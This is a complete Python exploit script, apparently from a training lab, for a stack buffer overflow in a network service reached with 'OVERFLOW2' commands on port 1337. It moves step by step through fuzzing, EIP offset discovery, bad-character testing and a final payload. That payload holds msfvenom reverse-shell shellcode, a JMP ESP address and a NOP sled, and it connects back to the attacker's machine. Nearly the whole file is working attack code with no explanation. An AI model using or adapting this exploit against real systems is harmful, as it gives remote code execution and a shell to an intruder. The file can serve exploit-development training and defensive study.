#!/usr/bin/python3

import socket
import sys
from struct import pack

TARGET = "10.10.193.165"
PORT = 1337
OFFSET = 634 # /usr/bin/msf-pattern_offset -q VALUE

def send_payload(payload, debug=False):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    s.recv(1024)
    if debug:
      breakpoint()
    s.send(b"OVERFLOW2 " + payload)
    s.close()
  except:
    print("Could not establish a connection")
    sys.exit(0)


def fuzz():
  for i in range(0, 10000, 500):
    buffer = b"A" * i
    print("Fuzzing %s bytes" % i)
    send_payload(buffer, debug=False)

def eip_offset():
  # /usr/bin/msf-pattern_create -l 1500
  pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9", "utf-8")

  send_payload(pattern)


def eip_control():
  buffer = b"A" * OFFSET
  eip = b"B" * 4
  payload = buffer + eip

  send_payload(payload)


def bad_chars():
  # \x00\x23\x3c\x83\xba
  all_chars = bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
  ])

  buffer = b"A" * OFFSET
  eip = b"B" * 4
  payload = buffer + eip + all_chars

  send_payload(payload)


def exploit():
  #  msfvenom -p 'windows/shell_reverse_tcp' LHOST=$(vpnip) LPORT=443 EXITFUNC=thread -f 'python' --bad-chars="\x00\x23\x3c\x83\xba" --var-name shellcode
  shellcode =  b""
  shellcode += b"\xfc\xbb\x51\x8d\xf6\x39\xeb\x0c\x5e\x56\x31"
  shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
  shellcode += b"\xff\xff\xff\xad\x65\x74\x39\x4d\x76\x19\xb3"
  shellcode += b"\xa8\x47\x19\xa7\xb9\xf8\xa9\xa3\xef\xf4\x42"
  shellcode += b"\xe1\x1b\x8e\x27\x2e\x2c\x27\x8d\x08\x03\xb8"
  shellcode += b"\xbe\x69\x02\x3a\xbd\xbd\xe4\x03\x0e\xb0\xe5"
  shellcode += b"\x44\x73\x39\xb7\x1d\xff\xec\x27\x29\xb5\x2c"
  shellcode += b"\xcc\x61\x5b\x35\x31\x31\x5a\x14\xe4\x49\x05"
  shellcode += b"\xb6\x07\x9d\x3d\xff\x1f\xc2\x78\x49\x94\x30"
  shellcode += b"\xf6\x48\x7c\x09\xf7\xe7\x41\xa5\x0a\xf9\x86"
  shellcode += b"\x02\xf5\x8c\xfe\x70\x88\x96\xc5\x0b\x56\x12"
  shellcode += b"\xdd\xac\x1d\x84\x39\x4c\xf1\x53\xca\x42\xbe"
  shellcode += b"\x10\x94\x46\x41\xf4\xaf\x73\xca\xfb\x7f\xf2"
  shellcode += b"\x88\xdf\x5b\x5e\x4a\x41\xfa\x3a\x3d\x7e\x1c"
  shellcode += b"\xe5\xe2\xda\x57\x08\xf6\x56\x3a\x45\x3b\x5b"
  shellcode += b"\xc4\x95\x53\xec\xb7\xa7\xfc\x46\x5f\x84\x75"
  shellcode += b"\x41\x98\xeb\xaf\x35\x36\x12\x50\x46\x1f\xd1"
  shellcode += b"\x04\x16\x37\xf0\x24\xfd\xc7\xfd\xf0\x52\x97"
  shellcode += b"\x51\xab\x12\x47\x12\x1b\xfb\x8d\x9d\x44\x1b"
  shellcode += b"\xae\x77\xed\xb6\x55\x10\x18\x4c\x76\x73\x74"
  shellcode += b"\x50\x78\x72\x3e\xdd\x9e\x1e\x50\x88\x09\xb7"
  shellcode += b"\xc9\x91\xc1\x26\x15\x0c\xac\x69\x9d\xa3\x51"
  shellcode += b"\x27\x56\xc9\x41\xd0\x96\x84\x3b\x77\xa8\x32"
  shellcode += b"\x53\x1b\x3b\xd9\xa3\x52\x20\x76\xf4\x33\x96"
  shellcode += b"\x8f\x90\xa9\x81\x39\x86\x33\x57\x01\x02\xe8"
  shellcode += b"\xa4\x8c\x8b\x7d\x90\xaa\x9b\xbb\x19\xf7\xcf"
  shellcode += b"\x13\x4c\xa1\xb9\xd5\x26\x03\x13\x8c\x95\xcd"
  shellcode += b"\xf3\x49\xd6\xcd\x85\x55\x33\xb8\x69\xe7\xea"
  shellcode += b"\xfd\x96\xc8\x7a\x0a\xef\x34\x1b\xf5\x3a\xfd"
  shellcode += b"\x3b\x14\xee\x08\xd4\x81\x7b\xb1\xb9\x31\x56"
  shellcode += b"\xf6\xc7\xb1\x52\x87\x33\xa9\x17\x82\x78\x6d"
  shellcode += b"\xc4\xfe\x11\x18\xea\xad\x12\x09\xea\x51\xed"
  shellcode += b"\xb2"
  buffer = b"A" * OFFSET
  eip = pack("<L", 0x625011D3) # jmp_esp
  nop = b"\x90" * 32
  payload = buffer + eip + nop + shellcode

  send_payload(payload)

#fuzz()
#eip_offset()
#eip_control()
#bad_chars()
exploit()
